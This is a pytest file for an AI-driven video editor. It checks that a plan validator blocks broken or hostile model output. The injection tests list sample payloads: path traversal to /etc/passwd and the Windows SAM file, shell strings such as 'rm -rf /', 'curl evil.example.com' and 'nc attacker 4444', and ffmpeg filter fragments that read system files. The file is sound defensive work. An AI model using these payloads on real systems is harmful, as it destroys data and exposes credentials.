"""Adversarial model output.

The premise of this editor is that a language model plans and deterministic
engines execute. That is only true if a hostile or broken plan cannot reach
the engines. These tests send the plan validator the things a model actually
gets wrong, plus the things an attacker would send if they could speak as the
model, and assert that none of them reach execution.
"""
from __future__ import annotations

import json

import pytest

from makma.ai.validation import (
    ProjectFacts,
    safety_problems,
    validate_plan,
)
from makma.schema.core import ProjectDocument, default_sequence
from makma.schema.operations import EditOperation, OpType, Scope


@pytest.fixture
def facts() -> ProjectFacts:
    """A one-clip project, so there is a real id to contrast bad ones with."""
    document = ProjectDocument(
        name="Adversarial", sequences=[default_sequence("Main", 1920, 1080, 30)]
    )
    sequence = document.sequences[0]
    track = sequence.tracks[0]
    from makma.schema.core import Clip

    track.clips.append(Clip(id="clip_real", kind="video", start=0.0, duration=5.0,
                            asset_id="asset_real"))
    return ProjectFacts.from_document(document, {"asset_real"})


def plan(operations: list[dict], **extra) -> dict:
    return {"summary": "test", "operations": operations, **extra}


def op(type_: str, parameters: dict | None = None, **scope) -> dict:
    return {"type": type_, "description": "", "scope": scope or {"type": "sequence"},
            "parameters": parameters or {}}


def codes(result) -> set[str]:
    return {p.code for p in result.problems}


# --- malformed responses ---------------------------------------------------


def test_invalid_json_is_a_problem_not_an_exception(facts):
    result = validate_plan("{ this is not json", facts)
    assert not result.ok
    assert codes(result) == {"invalid_json"}
    # The model has to be told what to fix.
    assert "JSON" in result.repair_brief()


def test_prose_around_the_json_is_recovered(facts):
    """Models narrate. That is not a failure worth a retry."""
    raw = 'Sure! Here you go:\n```json\n{"summary":"s","operations":[]}\n```'
    result = validate_plan(raw, facts)
    assert result.ok
    assert result.summary == "s"


def test_an_empty_response_is_rejected(facts):
    assert codes(validate_plan("", facts)) == {"empty_response"}


def test_a_json_array_is_not_a_plan(facts):
    assert codes(validate_plan("[1, 2, 3]", facts)) == {"not_an_object"}


def test_operations_must_be_present_and_a_list(facts):
    assert codes(validate_plan({"summary": "s"}, facts)) == {"missing_operations"}
    assert codes(validate_plan({"operations": "delete everything"}, facts)) == {
        "missing_operations"
    }


def test_an_operation_that_is_not_an_object_is_rejected(facts):
    result = validate_plan(plan(["delete_clip"]), facts)
    assert codes(result) == {"malformed_operation"}
    assert result.operations == []


# --- unknown vocabulary ----------------------------------------------------


def test_an_invented_operation_never_reaches_execution(facts):
    result = validate_plan(plan([op("delete_everything")]), facts)
    assert not result.ok
    assert codes(result) == {"unknown_operation"}
    assert result.operations == []


def test_an_invented_effect_is_rejected(facts):
    result = validate_plan(
        plan([op("add_effect", {"type": "make_it_pop"}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert "unknown_effect" in codes(result)


def test_an_invented_transition_is_rejected(facts):
    result = validate_plan(
        plan([op("set_transition", {"transition": "star_wipe_deluxe"},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert "unknown_transition" in codes(result)


def test_an_unimplemented_operation_is_reported_not_repaired(facts):
    """Asking the model again will not make object removal exist."""
    result = validate_plan(plan([op("remove_object")]), facts)
    assert result.ok, "this is a capability gap, not a validation failure"
    assert result.unsupported == ["remove_object"]
    assert result.operations == []


# --- references ------------------------------------------------------------


def test_a_hallucinated_clip_id_is_rejected(facts):
    result = validate_plan(
        plan([op("delete_clip", type="clip", clip_ids=["clip_imaginary"])]), facts)
    assert "unknown_clip" in codes(result)
    assert "clip_imaginary" in result.repair_brief()


def test_a_hallucinated_track_id_is_rejected(facts):
    result = validate_plan(
        plan([op("set_track", {"muted": True}, type="track",
                 track_ids=["track_nope"])]), facts)
    assert "unknown_track" in codes(result)


def test_a_hallucinated_asset_id_is_rejected(facts):
    result = validate_plan(
        plan([op("add_clip", {"asset_id": "asset_that_never_existed"})]), facts)
    assert "unknown_asset" in codes(result)


def test_a_real_clip_id_passes(facts):
    result = validate_plan(
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]), facts)
    assert result.ok, result.repair_brief()
    assert len(result.operations) == 1


# --- numbers ---------------------------------------------------------------


@pytest.mark.parametrize("value", [float("nan"), float("inf"), float("-inf")])
def test_non_finite_numbers_are_rejected(facts, value):
    result = validate_plan(
        plan([op("set_speed", {"speed": value}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert codes(result) & {"not_finite", "out_of_range"}
    assert result.operations == []


def test_nan_arriving_as_json_text_is_rejected(facts):
    """Python's json module accepts bare NaN. The validator must not."""
    raw = json.dumps(plan([op("set_speed", {"speed": float("nan")}, type="clip",
                              clip_ids=["clip_real"])]))
    assert "NaN" in raw
    result = validate_plan(raw, facts)
    assert not result.ok
    assert result.operations == []


def test_an_absurd_number_is_rejected(facts):
    result = validate_plan(
        plan([op("set_duration", {"duration": 1e30}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert "out_of_range" in codes(result)


def test_a_negative_duration_is_rejected(facts):
    result = validate_plan(
        plan([op("set_duration", {"duration": -5.0}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert "out_of_range" in codes(result)


def test_a_backwards_time_range_is_rejected(facts):
    result = validate_plan(
        plan([op("remove_range", {"start": 10.0, "end": 2.0})]), facts)
    assert "backwards_range" in codes(result)


def test_a_backwards_scope_range_is_rejected(facts):
    result = validate_plan(
        plan([op("split_clip", {"time": 1.0}, type="range", start=9.0, end=1.0)]),
        facts)
    assert "backwards_range" in codes(result)


def test_opacity_outside_zero_to_one_is_rejected(facts):
    result = validate_plan(
        plan([op("set_transform", {"opacity": 40}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert "out_of_range" in codes(result)


def test_a_deeply_nested_bad_number_is_still_caught(facts):
    """Keyframe values arrive inside a list of objects, not at the top level."""
    result = validate_plan(
        plan([op("set_keyframes",
                 {"property": "x",
                  "keyframes": [{"time": 0.0, "value": 0},
                                {"time": float("inf"), "value": 100}]},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert result.operations == []


# --- injection -------------------------------------------------------------


@pytest.mark.parametrize("payload", [
    "C:/Windows/win.ini",
    "C:\\Windows\\System32\\config\\SAM",
    "/etc/passwd",
    "../../../../etc/shadow",
    "..\\..\\secrets.env",
    "\\\\attacker\\share\\x.cube",
])
def test_a_file_path_where_a_value_belongs_is_rejected(facts, payload):
    result = validate_plan(
        plan([op("add_effect", {"type": "lut", "asset_id": payload}, type="clip",
                 clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert result.operations == [], f"{payload} reached execution"


@pytest.mark.parametrize("payload", [
    "; rm -rf /",
    "$(cat /etc/passwd)",
    "`whoami`",
    "x && curl evil.example.com",
    "a | nc attacker 4444",
])
def test_a_shell_command_where_a_value_belongs_is_rejected(facts, payload):
    result = validate_plan(
        plan([op("add_effect", {"type": "color_grade", "preset": payload},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert "unsafe_value" in codes(result)
    assert result.operations == []


@pytest.mark.parametrize("payload", [
    "lut3d=file=/etc/passwd",
    "movie=/etc/passwd",
    "drawtext=text='pwned':fontfile=/etc/passwd",
    "geq=r='X'",
])
def test_a_filtergraph_fragment_where_a_value_belongs_is_rejected(facts, payload):
    result = validate_plan(
        plan([op("set_transition", {"transition": "dissolve", "easing": payload},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert "unsafe_value" in codes(result)


def test_a_lut_named_by_path_is_rejected_even_with_a_valid_asset_id(facts):
    """The exact shape that was once accepted by the edit engine."""
    result = validate_plan(
        plan([op("add_effect",
                 {"type": "lut", "asset_id": "asset_real",
                  "parameters": {"path": "C:/Windows/win.ini"}},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert not result.ok
    assert "unsafe_value" in codes(result)
    assert result.operations == []


def test_real_text_content_is_not_mistaken_for_an_attack(facts):
    """Captions legitimately contain shell characters. They are not commands."""
    result = validate_plan(
        plan([op("add_text",
                 {"text": "Save $50 today | limited time & free shipping",
                  "start": 0, "duration": 3})]), facts)
    assert result.ok, result.repair_brief()
    assert len(result.operations) == 1


# --- volume ----------------------------------------------------------------


def test_an_implausibly_long_plan_is_rejected(facts):
    result = validate_plan(
        plan([op("add_marker", {"time": 1.0}) for _ in range(600)]), facts)
    assert codes(result) == {"too_many_operations"}


def test_an_implausibly_long_list_parameter_is_rejected(facts):
    result = validate_plan(
        plan([op("add_marker", {"times": list(range(20000))})]), facts)
    assert "list_too_long" in codes(result)


def test_a_giant_string_parameter_is_rejected(facts):
    result = validate_plan(
        plan([op("add_effect", {"type": "color_grade", "preset": "x" * 4000},
                 type="clip", clip_ids=["clip_real"])]), facts)
    assert "string_too_long" in codes(result)


# --- partial validity ------------------------------------------------------


def test_valid_operations_survive_alongside_invalid_ones(facts):
    """The repair prompt names the broken step; the good ones are still there."""
    result = validate_plan(plan([
        op("delete_clip", type="clip", clip_ids=["clip_real"]),
        op("set_speed", {"speed": float("inf")}, type="clip",
           clip_ids=["clip_real"]),
    ]), facts)
    assert not result.ok
    assert [o.type for o in result.operations] == [OpType.DELETE_CLIP]
    assert "operation 2" in result.repair_brief()


def test_every_problem_names_the_operation_it_came_from(facts):
    result = validate_plan(plan([
        op("delete_clip", type="clip", clip_ids=["ghost_a"]),
        op("delete_clip", type="clip", clip_ids=["ghost_b"]),
    ]), facts)
    indexes = [p.operation_index for p in result.problems]
    assert indexes == [0, 1]


# --- the endpoint guard ----------------------------------------------------


def _edit(type_: str, parameters: dict) -> EditOperation:
    return EditOperation(type=OpType(type_), scope=Scope(type="all"),
                         parameters=parameters)


def test_the_client_guard_blocks_a_path_but_allows_an_ordinary_edit():
    assert safety_problems([_edit("set_speed", {"speed": 0.5})]) == []
    assert safety_problems([_edit("add_effect", {
        "type": "lut", "parameters": {"path": "/etc/passwd"}})])


def test_the_client_guard_blocks_non_finite_values():
    assert safety_problems([_edit("set_transform", {"x": float("nan")})])


def test_the_operations_endpoint_rejects_an_unsafe_value(client):
    project = client.post("/api/projects", json={
        "name": "Guarded", "width": 320, "height": 180, "fps": 25}).json()
    resp = client.post(f"/api/projects/{project['id']}/operations", json={
        "operations": [{
            "type": "add_effect", "description": "sneaky",
            "scope": {"type": "all"},
            "parameters": {"type": "lut", "parameters": {"path": "C:/Windows/win.ini"}},
        }],
        "label": "sneaky",
    })
    assert resp.status_code == 400
    assert resp.json()["detail"]["code"] == "INVALID_OPERATIONS"


def test_the_ai_apply_endpoint_rejects_an_unsafe_plan(client):
    project = client.post("/api/projects", json={
        "name": "Guarded plan", "width": 320, "height": 180, "fps": 25}).json()
    resp = client.post(f"/api/projects/{project['id']}/ai/apply", json={
        "plan": {
            "command": "grade it",
            "summary": "Apply a look",
            "operations": [{
                "type": "add_effect", "description": "look",
                "scope": {"type": "all"},
                "parameters": {"type": "lut",
                               "parameters": {"path": "/etc/passwd"}},
            }],
        },
    })
    assert resp.status_code == 400
    assert resp.json()["detail"]["code"] == "INVALID_PLAN"


# --- the repair loop -------------------------------------------------------


class ScriptedProvider:
    """A model that returns exactly what a test tells it to, in order."""

    name = "scripted"

    def __init__(self, payloads: list[dict | str]) -> None:
        self.payloads = list(payloads)
        self.calls: list[list[dict]] = []

    capabilities = None  # set in __init_subclass__ substitute below

    def available(self) -> bool:
        return True

    def describe(self) -> dict:
        return {"name": self.name, "capabilities": ["reason"], "available": True}

    def reason(self, system, messages, tools=None, max_tokens=4096,
               temperature=0.2):
        from makma.ai.router import ModelResponse, Usage

        self.calls.append(list(messages))
        payload = self.payloads.pop(0) if self.payloads else {}
        return ModelResponse(data={"input": payload},
                             usage=Usage(provider=self.name, cost_usd=0.001))


@pytest.fixture
def scripted(monkeypatch):
    """Install a scripted model as the only REASON provider."""
    from makma.ai import router as router_module
    from makma.ai.router import Capability, ModelRouter

    ScriptedProvider.capabilities = {Capability.REASON}

    def install(payloads):
        provider = ScriptedProvider(payloads)
        fake = ModelRouter()
        fake.register(provider)
        monkeypatch.setattr(router_module, "get_router", lambda: fake)
        monkeypatch.setattr("makma.ai.director.get_router", lambda: fake)
        return provider

    return install


def run_director(command: str = "make it cinematic"):
    from makma.ai.director import plan_edit
    from makma.schema.core import Clip, ProjectDocument, default_sequence

    document = ProjectDocument(
        name="Repair", sequences=[default_sequence("Main", 1920, 1080, 30)])
    document.sequences[0].tracks[0].clips.append(
        Clip(id="clip_real", kind="video", start=0.0, duration=5.0,
             asset_id="asset_real"))
    return plan_edit(command=command, document=document, assets=[], mode="llm")


def test_a_bad_plan_is_repaired_rather_than_dropped(scripted):
    """The model gets one corrected shot before anything falls back."""
    provider = scripted([
        plan([op("delete_clip", type="clip", clip_ids=["clip_hallucinated"])]),
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]),
    ])
    result = run_director()

    assert len(provider.calls) == 2, "the model was not asked to correct itself"
    assert [o.type.value for o in result.operations] == ["delete_clip"]
    assert any("corrected it" in w for w in result.warnings)


def test_the_repair_request_names_the_actual_problem(scripted):
    provider = scripted([
        plan([op("delete_clip", type="clip", clip_ids=["clip_hallucinated"])]),
        plan([]),
    ])
    run_director()

    repair = provider.calls[1][-1]["content"]
    assert repair.startswith("That plan was rejected")
    assert "clip_hallucinated" in repair, "the model cannot fix what it is not told"


def test_a_model_that_never_recovers_falls_back_honestly(scripted):
    bad = plan([op("set_speed", {"speed": float("inf")}, type="clip",
                   clip_ids=["clip_real"])])
    provider = scripted([bad, bad, bad, bad])
    result = run_director("speed it up")

    # One first attempt plus the configured repair attempts, and no more.
    from makma.config import settings
    assert len(provider.calls) == 1 + settings.plan_repair_attempts

    assert result.operations == [] or result.planner != "llm"
    assert any("validation" in w.lower() or "offline" in w.lower()
               for w in result.warnings), result.warnings


def test_repair_stops_as_soon_as_the_plan_validates(scripted):
    provider = scripted([
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]),
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]),
    ])
    run_director()
    assert len(provider.calls) == 1, "a valid plan was retried anyway"


def test_every_attempt_is_billed(scripted):
    provider = scripted([
        plan([op("delete_clip", type="clip", clip_ids=["ghost"])]),
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]),
    ])
    result = run_director()
    assert result.estimate.usd == pytest.approx(0.002), (
        "a repair round is a real billed call and must be counted"
    )


def test_malformed_json_from_the_model_is_repaired_not_crashed(scripted):
    provider = scripted([
        "{ not json at all",
        plan([op("delete_clip", type="clip", clip_ids=["clip_real"])]),
    ])
    result = run_director()
    assert len(provider.calls) == 2
    assert [o.type.value for o in result.operations] == ["delete_clip"]
